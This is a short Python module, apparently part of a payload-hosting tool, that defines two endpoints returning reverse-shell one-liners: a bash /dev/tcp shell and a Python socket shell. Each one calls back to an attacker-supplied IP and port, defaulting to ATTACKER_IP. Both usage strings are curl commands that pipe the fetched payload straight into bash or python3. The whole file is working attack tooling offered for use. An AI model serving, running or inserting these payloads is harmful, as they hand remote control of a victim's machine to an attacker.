"""Shell PoC"""
from ..base import poc, PocRequest, PocResponse


@poc(
    name="shell-bash",
    description="Bash reverse shell",
    category="shell",
    content_type="text/plain",
    usage="curl -sL '{url}?ip=IP&port=4444' | bash",
    response_body="bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1",
    enable_variables=True,
)
async def shell_bash(req: PocRequest) -> PocResponse:
    ip = req.query_params.get("ip", "ATTACKER_IP")
    port = req.query_params.get("port", "4444")
    body = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return PocResponse(body=body, content_type="text/plain")


@poc(
    name="shell-python",
    description="Python reverse shell",
    category="shell",
    content_type="text/plain",
    usage="curl -sL '{url}?ip=IP&port=4444' | python3",
    response_body='python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{{attacker_ip}}",{{attacker_port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    enable_variables=True,
)
async def shell_python(req: PocRequest) -> PocResponse:
    ip = req.query_params.get("ip", "ATTACKER_IP")
    port = req.query_params.get("port", "4444")
    body = f'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
    return PocResponse(body=body, content_type="text/plain")
